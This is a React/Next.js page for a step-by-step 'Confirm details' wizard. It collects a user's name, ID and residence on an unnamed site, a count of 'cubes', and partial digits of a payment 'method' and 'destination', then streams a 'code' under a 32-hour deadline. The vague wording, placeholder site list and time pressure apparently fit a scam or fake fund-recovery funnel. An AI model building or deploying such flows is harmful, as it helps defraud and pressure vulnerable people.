'use client';

import React, { useEffect, useRef, useState } from 'react';
import UserTopBar from '@/components/UserTopBar';

const OPTIONS = ['кокз 1','кокз 2','кокз 3','кокоз 4','кокоз 5','кокоз 6','кокоз 7','кокоз 8','кокоз 9','кокоз 10','кокоз 11'];

type Profile = { nameOnSite?:string; idOnSite?:string; residence?:string; photoUrl?:string };
type Me = { id:number; role:'USER'|'ADMIN'; profile?:Profile; codeConfig?:{ lastStep?:number } };

export default function ConfirmPage(){
  const [me,setMe]=useState<Me|null>(null);
  const [step,setStep]=useState<number>(1);
  const [profile,setProfile]=useState<Profile|undefined>(undefined);
  const [site,setSite]=useState<string>('');
  const [nameOnSite,setName]=useState('');
  const [idOnSite,setId]=useState('');
  const [residence,setRes]=useState('');
  const [matches,setMatches]=useState<boolean|null>(null);
  const [cubes,setCubes]=useState<number|''>('');
  const [method,setMethod]=useState('');
  const [codeChars,setCodeChars]=useState<string>('');
  const [paused,setPaused]=useState(false);
  const [showPauseNote,setShowPauseNote]=useState(false);
  const evtRef = useRef<EventSource|null>(null);

  useEffect(()=>{
    (async()=>{
      const r = await fetch('/api/me',{cache:'no-store'}).then(x=>x.json()).catch(()=>null);
      const u:Me|undefined = r?.user;
      if(!u){ window.location.href='/login'; return; }
      if(u.role==='ADMIN'){ window.location.href='/admin'; return; }
      setMe(u);
      setProfile(u.profile||{});
      const started = localStorage.getItem('code_started')==='1';
      const saved = localStorage.getItem('code_chars')||'';
      if((u.codeConfig?.lastStep||1)>=6 || started){
        setStep(6);
        if(saved){ setCodeChars(saved); setPaused(true); setShowPauseNote(true); }
      }
    })();
    return ()=>{ if(evtRef.current) evtRef.current.close(); };
  },[]);

  useEffect(()=>{
    function onVis(){ if(document.visibilityState!=='visible'){ setPaused(true); setShowPauseNote(true);} }
    document.addEventListener('visibilitychange', onVis);
    return ()=>document.removeEventListener('visibilitychange', onVis);
  },[]);

  function startStream(){
    if(evtRef.current) evtRef.current.close();
    const es = new EventSource('/api/code-stream');
    evtRef.current = es;
    es.onmessage = (e)=>{
      try{
        const data = JSON.parse(e.data);
        if(data.type==='char' && !paused){
          setCodeChars(prev=>{
            const next = prev + data.value;
            localStorage.setItem('code_chars', next);
            return next;
          });
        }
      }catch{}
    };
    localStorage.setItem('code_started','1');
  }
  function doPause(){ setPaused(true); setShowPauseNote(true); }
  function doStart(){ setPaused(false); setShowPauseNote(false); }

  async function checkMatch(){
    const ok = (profile?.idOnSite||'').trim() === idOnSite.trim();
    setMatches(ok);
    setStep(ok ? 4 : 3);
  }

  const Card = ({children}:{children:React.ReactNode}) => (
    <div style={{width:820, maxWidth:'92vw', background:'rgba(17,24,39,0.86)', border:'1px solid #1f2937', borderRadius:16, padding:18, color:'#e5e7eb', boxShadow:'0 10px 30px rgba(0,0,0,.35)', zIndex:1, position:'relative'}}>{children}</div>
  );

  return (
    <div style={{minHeight:'100vh', position:'relative', background:'linear-gradient(180deg,#0b1220,#0f172a)'}}>
      <UserTopBar />
      <div style={{position:'absolute', inset:0, display:'grid', placeItems:'center', pointerEvents:'none', zIndex:0}}>
        <img src="/images/Logo_3.webp" alt="logo" style={{width:420, maxWidth:'68vw', opacity:.82, filter:'drop-shadow(0 20px 70px rgba(0,0,0,.55))'}}/>
      </div>
      <div style={{display:'grid', placeItems:'center', padding:'28px 12px', position:'relative', zIndex:1}}>
        <Card>
          <div style={{fontSize:20, fontWeight:800, marginBottom:12, textAlign:'center'}}>Confirm details</div>

          {step===1 && (
            <div style={{display:'grid', gap:10}}>
              <label>The name of the website where you communicated and conducted transactions</label>
              <select value={site} onChange={e=>setSite(e.target.value)}
                style={{background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}}>
                <option value="">Select...</option>
                {OPTIONS.map(o=><option key={o} value={o}>{o}</option>)}
              </select>
              <div style={{display:'flex', gap:10, marginTop:6, flexWrap:'wrap'}}>
                <a className="btn" href="/chat" style={{borderColor:'#38bdf8', color:'#38bdf8'}}>Open support chat</a>
                <button className="btn btn-primary" disabled={!site} onClick={()=>setStep(2)} style={{borderColor:'#22c55e', color:'#22c55e'}}>Next</button>
              </div>
            </div>
          )}

          {step===2 && (
            <div style={{display:'grid', gap:12}}>
              <div>
                <label>Your name on the website</label>
                <input value={nameOnSite} onChange={e=>setName(e.target.value)} placeholder="John"
                  style={{width:'100%', background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}} />
              </div>
              <div>
                <label>Your ID on the website</label>
                <input value={idOnSite} onChange={e=>setId(e.target.value)} placeholder="ID12345"
                  style={{width:'100%', background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}} />
              </div>
              <div>
                <label>Place of residence indicated on the website</label>
                <input value={residence} onChange={e=>setRes(e.target.value)} placeholder="City, Country"
                  style={{width:'100%', background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}} />
              </div>
              <div style={{display:'flex', gap:10, marginTop:2, flexWrap:'wrap'}}>
                <a className="btn" href="/chat" style={{borderColor:'#38bdf8', color:'#38bdf8'}}>Open support chat</a>
                <button className="btn btn-primary" onClick={checkMatch} style={{borderColor:'#22c55e', color:'#22c55e'}}>Confirm and continue</button>
              </div>
            </div>
          )}

          {step===3 && (
            <div style={{display:'grid', gap:12}}>
              <div style={{background:'#1f2937', border:'1px solid #334155', color:'#e5e7eb', padding:10, borderRadius:8}}>
                The entered data does not match. Please contact support.
              </div>
              <div><a className="btn" href="/chat" style={{borderColor:'#38bdf8', color:'#38bdf8'}}>Open support chat</a></div>
            </div>
          )}

          {step===4 && (
            <div style={{display:'grid', gap:8}}>
              <label>How many cubes did you use?</label>
              <input type="number" value={cubes} onChange={e=>setCubes(e.target.value===''? '': parseInt(e.target.value||'0'))}
                style={{background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}} />
              <div style={{fontSize:12, color:'#94a3b8'}}>*please indicate the approximate quantity</div>
              <div><button className="btn" onClick={()=>setStep(5)} style={{borderColor:'#22c55e', color:'#22c55e'}}>Next</button></div>
            </div>
          )}

          {step===5 && (
            <div style={{display:'grid', gap:8}}>
              <label>Enter the first four digits of the method and the last digits of the destination in the format ****-****</label>
              <input placeholder="1234-1234" value={method} onChange={e=>setMethod(e.target.value)}
                style={{background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}} />
              <div><button className="btn" disabled={!/^\d{4}-\d{4}$/.test(method)} onClick={()=>setStep(6)} style={{borderColor:'#22c55e', color:'#22c55e'}}>Next</button></div>
            </div>
          )}

          {step===6 && (
            <div style={{display:'grid', gap:10}}>
              <div style={{display:'flex', gap:8, flexWrap:'wrap'}}>
                <button className="btn" onClick={startStream} style={{borderColor:'#38bdf8', color:'#38bdf8'}}>Generate code</button>
                <button className="btn" onClick={doPause}>Pause</button>
                <button className="btn" onClick={doStart}>Start</button>
              </div>
              <div style={{whiteSpace:'pre-wrap', background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px', minHeight:120}}>
                {(codeChars || 'Waiting for code...').split('').join(' ')}
              </div>
              {showPauseNote && (
                <div style={{background:'#fffbeb', border:'1px solid #fcd34d', color:'#1f2937', borderRadius:8, padding:10}}>
                  The pause is set for a maximum of 32 hours, after which the code will become invalid
                </div>
              )}
            </div>
          )}
        </Card>
      </div>
    </div>
  );
}
